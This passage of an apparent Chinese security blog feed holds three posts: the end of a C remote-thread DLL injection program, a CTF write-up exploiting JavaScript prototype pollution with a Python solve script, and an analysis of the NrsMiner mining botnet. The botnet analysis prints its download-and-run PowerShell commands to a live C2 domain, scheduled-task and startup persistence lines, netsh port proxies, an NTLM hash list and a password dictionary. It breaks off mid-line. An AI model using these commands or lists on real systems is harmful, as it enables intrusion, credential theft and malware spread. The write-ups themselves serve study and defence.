ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}int main(){        int pid = 1148;        EnbalePrivileges();        char *dllname = &quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;;        int dllnamesize = strlen(dllname) * 2;        HANDLE pidmodule = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);        if (pidmodule == NULL) {               printf(&quot;OpenProcess Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;OpenProcess HANDLE 0x%x\n&quot;, pidmodule);        LPVOID vaeAddr = VirtualAllocEx(pidmodule, NULL, dllnamesize, MEM_COMMIT,  PAGE_READWRITE);        if (vaeAddr == NULL) {               printf(&quot;VirtualAllocEx Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);        if (loadaddress == NULL) {               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);        if (runthread == NULL) {               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());        }        printf(&quot;CreateRemoteThread Sucess\n&quot;);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到&lt;br&gt;系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。&lt;br&gt;然后联想到是不是权限</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>js源链污染</title>
    <link href="http://422926799.github.io/posts/3e45dbe4.html"/>
    <id>http://422926799.github.io/posts/3e45dbe4.html</id>
    <published>2021-03-10T11:52:49.000Z</published>
    <updated>2021-03-10T12:10:55.095Z</updated>
    
    <content type="html"><![CDATA[<p>题目考的目的:js原链污染</p><h2 id="js原链污染简介"><a href="#js原链污染简介" class="headerlink" title="js原链污染简介"></a>js原链污染简介</h2><blockquote><p>JavaScript是一门灵活的语言，基于原型实现继承，原型是Javascript的继承的基础。<br>它本身不提供一个 class实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的<br>遵循ECMAScript标准，someObject.[[Prototype]] 符号是用于指向 someObject 的原型。从 ECMAScript 6 开始，[[Prototype]] 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <strong>proto</strong></p></blockquote><p>每个实例对象都有一个私有属性<strong>proto</strong>指向它的构造函数的原型prototype，也就是</p><pre><code class="javascript">function a(){    this.a=&quot;AAA&quot;}b=new a()b.__proto__===a.Prototype</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6Jvp9S.png" alt=""><br>原型prototype是类的一个属性，而这个<strong>属性中的值和方法被每一个由类实例出来的对象所共有</strong>，而我们可以通过实例对象<code>test1.__proto__</code>来访问Test类的原型，那么这样就出现了一个问题，<strong>假如我们可以控制实例对象的<code>__proto__</code>属性，则等于可以修改该类所有实例对象的<code>__proto__</code>属性。</strong><br><img src="https://s3.ax1x.com/2021/03/10/6JvL2F.png" alt="网上的图"></p><h2 id="js原链污染测试"><a href="#js原链污染测试" class="headerlink" title="js原链污染测试"></a>js原链污染测试</h2><p>定义一个对象测试</p><pre><code class="javascript">challenger={&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;age&quot;:80}key={}challenger.__proto__.pwd2=&quot;pwd&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6JvVA0.png" alt=""></p><p>由于源链被污染，定义的pwd2值在任何地方都可以被访问到<br><img src="https://s3.ax1x.com/2021/03/10/6JvA7q.png" alt=""></p><p>更直接的表明<br><img src="https://s3.ax1x.com/2021/03/10/6Jvlu9.png" alt=""></p><p>非对象污染则会失败<br><img src="https://s3.ax1x.com/2021/03/10/6Jv3H1.png" alt=""></p><p>but，实际上的源链污染需要找到对应能操控对象的函数来进行污染</p><h2 id="bugkuctf-sodirty题目分析"><a href="#bugkuctf-sodirty题目分析" class="headerlink" title="bugkuctf sodirty题目分析"></a>bugkuctf sodirty题目分析</h2><p>源码如下:</p><pre><code class="javascript">var express = require(&#39;express&#39;);const setFn = require(&#39;set-value&#39;);var router = express.Router();const Admin = {    &quot;password&quot;:process.env.password?process.env.password:&quot;password&quot;}router.post(&quot;/getflag&quot;, function (req, res, next) {    if (req.body.password === undefined || req.body.password === req.session.challenger.password){        res.send(&quot;登录失败&quot;);    }else{        if(req.session.challenger.age &gt; 79){            res.send(&quot;糟老头子坏滴很&quot;);        }        let key = req.body.key.toString();        let password = req.body.password.toString();        if(Admin[key] === password){            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);        }else {            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);        }    }});router.get(&#39;/reg&#39;, function (req, res, next) {    req.session.challenger = {        &quot;username&quot;: &quot;user&quot;,        &quot;password&quot;: &quot;pass&quot;,        &quot;age&quot;: 80    }    res.send(&quot;用户创建成功!&quot;);});router.get(&#39;/&#39;, function (req, res, next) {    res.redirect(&#39;index&#39;);});router.get(&#39;/index&#39;, function (req, res, next) {    res.send(&#39;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#39;);});router.post(&quot;/update&quot;, function (req, res, next) {    if(req.session.challenger === undefined){        res.redirect(&#39;/reg&#39;);    }else{        if (req.body.attrkey === undefined || req.body.attrval === undefined) {            res.send(&quot;传参有误&quot;);        }else {            let key = req.body.attrkey.toString();            let value = req.body.attrval.toString();            setFn(req.session.challenger, key, value);            res.send(&quot;修改成功&quot;);        }    }});module.exports = router;</code></pre><p>分析流程:</p><pre><code class="text">/路径：1.重定向到/reg路径/reg路径:创建一个req.session.challenger对象/update路径:1.req.session.challenger如果为空则被重定向到/reg路径    2.req.body.attrkey或req.body.attrval为undefined的情况下返回为&quot;传参有误&quot;    2.如果不为undefined将设置key和value，调用setFn函数设置req.session.challenger对象的值传参链:req.body.attrkey/req.body.attrval-&gt;let key = req.body.attrkey.toString();/let value = req.body.attrval.toString()；-&gt;setFn(req.session.challenger, key, value); #原链污染点/getflag路径:1.req.body.password为undefined或req.body.password等于req.session.challenger对象里的password则返回登录失败2.req.session.challenger.age值大于79返回糟老头子坏滴很3.Admin对象里的key键的值等于req.body.password则返回真的flag</code></pre><p>漏洞点出现在</p><pre><code class="javascript">setFn(req.session.challenger, key, value);</code></pre><p>setFn函数对应<code>require(&#39;set-value&#39;);</code>,位于同目录下的<code>set-value/index.js</code>里的result函数</p><pre><code class="javascript">function result(target, path, value, merge) {  if (merge &amp;&amp; isPlain(target[path]) &amp;&amp; isPlain(value)) {    target[path] = merge({}, target[path], value);  } else {    target[path] = value;  }}</code></pre><p>对应的Github:<a href="https://github.com/freewisdom/set-value" target="_blank" rel="noopener">https://github.com/freewisdom/set-value</a><br><img src="https://s3.ax1x.com/2021/03/10/6JvsEt.png" alt=""></p><p>由于需要以<code>{&quot;key&quot;:&quot;value&quot;}</code>的方式来进行更新，所以要用json，具体是看文章知道</p><p>考点如下</p><pre><code>1.发现路由&quot;/reg&quot;会创建一个challenger用户字典2.发现路由&quot;/update&quot;可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改3.路由&quot;/getflag&quot;可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password是多少我们是不知道的</code></pre><p>题目解题思路如下</p><pre><code>1.操控源链创建一个变量2.更新req.session.challenger对象里age键值</code></pre><p>最后请求/getflag路径的时候，设置key参数为新建变量的名称和设置password变量名为新建变量名的值,使判断成立</p><pre><code class="javascript">if (req.body.password === undefined || req.body.password === req.session.challenger.password){        res.send(&quot;登录失败&quot;);    }else{        if(req.session.challenger.age &gt; 79){            res.send(&quot;糟老头子坏滴很&quot;);        }        let key = req.body.key.toString();        let password = req.body.password.toString();        if(Admin[key] === password){            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);        }else {            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);        }    }</code></pre><p>payload如下</p><pre><code class="python">import requestsclass getflag(object):    def __init__(self,url):        self.requests=requests.session()        self.headers={&quot;Content-Type&quot;: &quot;application/json&quot;}        self.reg=&quot;{}/reg&quot;.format(url)        self.update=&quot;{}/update&quot;.format(url)        self.getflag=&quot;{}/getflag&quot;.format(url)    def getflag_(self):        reg=self.requests.get(self.reg)        print(reg.text)        update=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;__proto__.pwd22&quot;,&quot;attrval&quot;:&quot;pwd&quot;})        print(update.text)        update2=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;age&quot;,&quot;attrval&quot;:10})        print(update2.text)        flag=self.requests.post(self.getflag,headers=self.headers,json={&quot;key&quot;:&quot;pwd22&quot;,&quot;password&quot;:&quot;pwd&quot;})        print(flag.text)if __name__ == &#39;__main__&#39;:    obj=getflag(&quot;http://114.67.246.176:19392&quot;)    obj.getflag_()</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6Jv28S.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_41107295/article/details/95789944" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/95789944</a><br><a href="https://www.cnblogs.com/escape-w/p/12347705.html" target="_blank" rel="noopener">https://www.cnblogs.com/escape-w/p/12347705.html</a><br><a href="https://www.wlhhlc.top/posts/49040/" target="_blank" rel="noopener">https://www.wlhhlc.top/posts/49040/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目考的目的:js原链污染&lt;/p&gt;
&lt;h2 id=&quot;js原链污染简介&quot;&gt;&lt;a href=&quot;#js原链污染简介&quot; class=&quot;headerlink&quot; title=&quot;js原链污染简介&quot;&gt;&lt;/a&gt;js原链污染简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;JavaScript是一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NrsMiner挖矿僵尸网络分析</title>
    <link href="http://422926799.github.io/posts/855d1ef5.html"/>
    <id>http://422926799.github.io/posts/855d1ef5.html</id>
    <published>2021-03-06T14:51:28.000Z</published>
    <updated>2021-03-06T15:54:08.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下午在群里看见一<code>app.any.run</code>的链接，没啥事情做分析了一下。做个记录</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>样本名称:shady.ps1<br>sha256:1a3960eaf2021049e1eaed4c76029420a62c881f65533b3741be2050328a2ac4<br>sha1:6b294f6ad208cb7d23172cafbccf3db3d78b2c62<br>md5:5474aa765ddd0c1dff33e5bbe4aba272    </p><p><code>shady.ps1</code>打开一看 ，混淆过的<br><img src="https://s3.ax1x.com/2021/03/06/6uhpx1.png" alt=""></p><p>定位到函数结尾，发现IEX<br><img src="https://s3.ax1x.com/2021/03/06/6u4YTO.png" alt=""></p><p>写到新的ps1，整体如下<br><img src="https://s3.ax1x.com/2021/03/06/6u4snP.png" alt=""></p><p>函数列表</p><pre><code>function make_smb1_anonymous_login_packet function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_smb1_login8_packet8 function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function localscan function geth function LoadApifunction sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-BootKeyfunction Get-HBootKeyfunction Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function Get-UserKeysfunction DumpHashesfunction Invoke-MypassFunction LGDJSRFunction Get-WiSDGKDantsFunction Get-l64ftionFunction bud-ksgLHDnwnFunction Add-SignedIntAsUnsignedFunction Compare-Val1GreaterThanVal2AsUIntFunction Convert-UIntToIntFunction Test-MemoryRangeValidFunction Write-BytesToMemoryFunction Get-DelegateTypeFunction klsdjlkhfDjswpdyFunction Enable-SeDebugPrivilegeFunction sadkjhdsjDFunction Get-ImageNtHeadersFunction DHWE-kidDFunction KDHSD-JUWFFunction HDSK-OUHFFunction KJSHDeUFHEF7Function Cthis-SectioDSnsFunction LSHDjh3-updFunction lhsdu-jsdFunction SDhk34JSDFunction usdKdhdfFunction KSHDUWKHFFunction SDHlhuhWEDSDDSFunction GessKUDBSDFunction LHSDGUKsdHFFunction SDLHLESDMEFunction MainFunction Mainfunction Invoke-SEfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMBTreeConnectAndXRequestfunction New-PacketSMBNTCreateAndXRequestfunction New-PacketSMBReadAndXRequestfunction New-PacketSMBWriteAndXRequestfunction New-PacketSMBCloseRequestfunction New-PacketSMBTreeDisconnectRequestfunction New-PacketSMBLogoffAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestFilefunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction New-PacketRPCBindfunction New-PacketRPCRequestfunction New-PacketSCMOpenSCManagerWfunction New-PacketSCMCreateServiceWfunction New-PacketSCMStartServiceWfunction New-PacketSCMDeleteServiceWfunction New-PacketSCMCloseServiceHandlefunction Get-StatusPendingfunction Get-UInt16DataLengthfunction Invoke-SMBCfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestfunction New-PacketSMB2FindRequestFilefunction New-PacketSMB2QueryInfoRequestfunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketSMB2IoctlRequest()function New-PacketSMB2SetInfoRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction Get-UInt16DataLengthfunction copyrun function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function New-PacketSMB2IoctlRequest()</code></pre><p><strong>执行过程</strong></p><pre><code>-5获取所有用户名添加到用户列表    匹配普通用户SID的正则:        添加到$alluser列表-4检查当前用户是不是管理员    获取本机hash:        用户标志位(变量名:$un)        用户hash(变量名:$hs)        匹配出是管理员的hash            添加到用户列表(变量名:alluser)            添加到hash列表(变量名:$allhash)-3获取明文密码和NTLM HASH    匹配出用户名(变量名:$mm)    匹配出明文密码(变量名:$pp)    匹配出NTLM HASH(变量名:$nn)    匹配出域名(变量名:$dd)    用户名不为空:        添加到$getusers列表        添加到$alluser列表    明文密码不为空:        添加到$getpasswd列表        添加到$allpass列表    函数不为空(31d6cfe0d16ae931b73c59d7e0c089c0为空hash):        添加到$gethashs列表        添加到$allhash列表    域名不为空、不为workgroup组、不为本地计算机名:        添加到$getdomain组</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIpxs.png" alt=""></p><p>之后循环执行以下内容</p><pre><code>while(true)循环执行:    1.线程休眠200秒    2.创建名为Global\PSexec的互斥锁    3.获取第一张网卡的MAC地址    4.获取杀毒软件    5.如果存在杀毒 (条件判断)        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|        False:$av变量为空    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容    8.调用localscan函数检查本地和内网445端口判断是否开启    9.调用localscan函数检查本地和内网65353端口判断是否开启    10.$Bserver数组不存在该IP调用copyrun函数        调用Invoke-SMBC函数hash传递攻击        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)                    netsh.exe firewall add portopening tcp 65353 DNS&amp;netsh interface portproxy add v4tov4 listenport=65353 connectaddress=1.1.1.1 connectport=53                    schtasks /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn Sync /tr &quot;powershell -nop -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AHMAbQBiACcAKQA=&quot; /F #解码base64:IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/p?smb&#39;)                    schtasks /run /tn Sync&#39;                    上传文件到:                        C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:                        C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try{(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True){try{IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/low?ipc&#39;)}catch{Sleep -m 2500000}}&quot;,0,false);}catch(e){}                        C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;        传递失败:    11.MS17010扫描攻击    12.休眠100秒</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIMs1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/03/06/6uIWyn.png" alt=""></p><p>提取出来的快捷方式<br><img src="https://s3.ax1x.com/2021/03/06/6uoZ0P.png" alt=""></p><p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表:</p><pre><code>administratoradmin</code></pre><p>hash表</p><pre><code>32ed87bdb5fdc5e9cba88547376818d48846f7eaee8fb117ad06bdd830b7586c259745cb123a52aa2e693aaacca2db522d20d252a479f485cdf5e171d93985bfc22b315c040ae6e0efee3518d830362b7a21990fcd3d759941e45c490f143d5f7ce21f17c0aee7fb9ceba532d0546ad62d7f1a5a61d3a96fb5159b5eef17adc6328727b81ca05805a68ef26acb252039f7eb9c06fafaa23c4bcf22ba6781c1e2579110c49145015c47ecd267657d3174320a78179516c385e35a93ffa0b1c4acf9e37e83b83c47a93c2f09f66408631b31fc0dc8f7dfad0e8bd7ccc3842f2ce9f2477a144dff4f216ab81f2ac3e3207dbecedb42ec3c5c7f965255338be4453cccd3d95ea08b81140eee3cfbb98c68f18d4ef8654a9adc66d4f628e94f66e31b6d3986e540a63647454a50e26477ef94e8cd0e4a9e89eab931dc5338fcbec54a0d757ad173d2fc249ce19364fd64c8ecaf27efb60c7b238910efe2a7e0676a3974ed32086b1317b742c3a92148df10198af326aa4850225b75c592d4ce19ccf5bb53a477af18526ada697ce2e51f76b34057b60b514c5402dde3d29a1845c36627cd214350e6172ce708ee05f9d6d70a72f5cfa80f07819ccbcfb72feb9eb9b7f67f5e3f66efd7298be6acd32eeeb27c1d7774d5bbec877ba1bbfcac2f1ae2961c4ecc8938fb93812779077127e976626920c58d0df184d829189c44fafb7ece3fa45a060bd2693ae4c05b601d05ca0c152efbcfafeb22eabda8fc5e68697a41ad70819c5bc807280974d80f45982011c4e9cf8a64cfa6893e2fb666cd566d48f40460fe1ceec6f6785997f3319553bb1b46daf193bb579bdb3b8c6f09637eccee9423d5425f22baf082877edf0a5223820b13c5212be1f85048d7cc8f70bfa508381a7cb6f73d13260089df6015b7b469cbe3acbc48a3a289e8cdb000c2b7a820b2a7351c899fd8e230caad9dd9b994bcd285980e1d9b302e16875844ef697759dea36d05aacaa547de42e9956678e7162e829be112225fedf856e38e1c65fe9f8cc8c6e9e8ba3344ce00078175a4fff9e37e83b83c47a93c2f09f66408631bfaf94587adbfb93df82380f7ca2be801711417f28b0f8d2c5c1cde9554cf8f88acf586e39c5838baeea66ec864d7c437114a90eadeb78697e8f5d14888324caf3837b6534834cc2a88c58bf90b2d96f448d28627b7f196284b73f3c6fae4eded8a72db9f0eea602e3770c45cd3ed9bcdbdc2ef9d128643a227639d2f142d1434ba48d0d7833d929ba60030ae19a63875b20b89488f6f2decabf80294727a04306e2ba7aaa0297ecba56e3d90393bc147324e773ec800dc70882568f5a41d2b6362b26c13b70e7d5a9724710a41e63688f5c864e939801f4f239ff455c33730f821da95b451c2736231eedb87d08f7edbcd73b0aeeb2d1c1907c8783a05e8dd08c0d1ba5fcad640041f86f8060b384915b6d9897df4bb61b416fa405159418033aaf9f89a2d4d0cef5f8912461132b30ffac5d668099409cb6fa223a32ea493b62386e5c805ab8dff955fdb893df85f47f96ab5f0c4b478ee16d9520e4eb4318417dc1cd2340de61ee329d2bb291acb56ed356698adc4fcffe90c3e6d250fcf167b592e4f8178b4c75788531b2e74768747bf8039a8506cd67c524a03ff84ba4e5ae7b89b3afea28d448ed31b5c70428973f5d97549f033374fa6d9f9ce247ffde5ae562ddfaa6b446c32764ab1ebf3ed161cff084477fe596a5db81874498a24a87f3a337d73085c45f9416be5787d8600affd88fa323b00d4560bf9fef0ec2f69943c5e63b4d2c104dbbcc15138b72b588feb889288fb953b5f094d47d1565c3dbde697d71690a769204beb12283678df54de3f3438343202c1dd523d0265bef1351ac828428d74f6da2968089fc91fb3ec3e03e2a202cbd54fd104b8504fefa80c9cc3f8439ada25af064a874efe2d13b29964cc2480b4ef454c59562e675cde26cce0356891a4a020e7c4957afc72e19ccf75ee54e06b06a5907af13cef4230fcaa8ad9a496b3e17f7fbfacc7299341630abb825ca50da31ce1fac1e9f54df56a8399599f1be040128b1dd9623c292e4dbf83aa056289935daea328977b20b9f917853e3dbf6e6831ecce607259305835048ce94ad0564e29a924a03510efa4141712f19e9dd5adf16919bb38a95c</code></pre><p>明文密码</p><pre><code>123456password12345678qwerty1234567891234512341111111234567dragon123123baseballabc123footballmonkeyletmein696969shadowmaster666666qwertyuiop123321mustang1234567890michael654321pussysuperman1qaz2wsx7777777fuckyou121212000000qazwsx123qwekillera123456a123456789woaini1314qq123456abc123456123456a123456789a147258369zxcvbnm98765432112345678910abc123qq123456789123456789.7708801314520woaini5201314520q123456123456abc1233211234567123123123123456.0123456789asd123456aa123456135792468q123456789abcd12345612345678900woaini520woaini123zxcvbnm1231111111111111111w123456aini1314abc123456789PASSWORDAa123456qwer12345123@abc123!@#qwe1qaz@WSXPassw0rd123qwe!@#112123321888888abcd1234p@sswordP@sswordp@ssw0rdP@ssw0rdP@SSWORDP@SSW0RDP@$$w0rdP@$$wordpassw0rdpassword1administrator</code></pre><p>其中计划任务里的url，下载的另外个ps1。其实就是一开始混淆过的ps1，用于权限维持(下载的update.png)<br>1.获取首个网卡MAC地址<br>2.互斥锁创建<br>3.检查C:\Windows\Temp\xxx.log是否存在，不存在则创建Winnet计划任务<br>4.休眠随机1-20秒<br>5.检查进程运行的命令是否带有downloadstring,没有远程下载执行</p><pre><code class="powershell">[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC) #首个网卡MAC地址try{        $name = &#39;Global\PSEXEC&#39;        $exeflag = $flase        New-Object System.Threading.Mutex ($true,$name,[ref]$exeflag) #互斥锁创建}catch{}$dt = Get-Date -Format &#39;yyMMdd&#39; #日期格式化$path = &quot;$env:temp\\ccc.log&quot;[string]$flag = test-path $path #检查路径是否存在$permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;) #判断当前用户是否位管理员$key = &quot;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;version=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + &quot;&amp;flag2=&quot; + $flag + &quot;&amp;domain=&quot; + (Get-WmiObject win32_computersystem).Domain + 